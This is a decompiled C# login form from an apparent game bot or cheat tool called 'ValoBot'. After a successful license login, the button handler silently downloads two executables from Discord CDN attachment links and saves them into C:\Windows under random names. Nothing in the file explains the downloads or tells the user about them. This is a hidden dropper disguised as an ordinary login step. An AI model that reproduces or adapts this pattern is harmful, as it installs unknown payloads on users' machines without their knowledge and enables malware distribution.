﻿using System;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Windows.Forms;
using AmongUs;
using LHSharp;

namespace ValoBot
{
	// Token: 0x02000019 RID: 25
	public partial class Form2 : Form
	{
		// Token: 0x06000173 RID: 371 RVA: 0x000077D6 File Offset: 0x00005BD6
		public Form2()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000174 RID: 372 RVA: 0x000077E4 File Offset: 0x00005BE4
		private void eliteSimple1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000175 RID: 373 RVA: 0x000077E8 File Offset: 0x00005BE8
		private void eliteButton3_Click_1(object sender, EventArgs e)
		{
			if (API.Login(this.textBox1.Text, this.textBox2.Text))
			{
				MessageBox.Show("Login successful!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				MessageBox.Show("Expiry: " + User.Expiry);
				base.Hide();
				WebClient webClient = new WebClient();
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/802153345530724385/802753511019773952/insqq1.exe", "C:\\Windows\\xazqwe.exe");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/802153345530724385/802753743438741524/insqq2.exe", "C:\\Windows\\e37b98.exe");
				new Form3().Show();
			}
		}

		// Token: 0x06000176 RID: 374 RVA: 0x0000786E File Offset: 0x00005C6E
		private void eliteButton2_Click_1(object sender, EventArgs e)
		{
			base.Hide();
			new Reg().ShowDialog();
		}

		// Token: 0x06000177 RID: 375 RVA: 0x00007881 File Offset: 0x00005C81
		private void eliteButton1_Click_1(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000178 RID: 376 RVA: 0x00007889 File Offset: 0x00005C89
		private void Form2_Load(object sender, EventArgs e)
		{
		}
	}
}
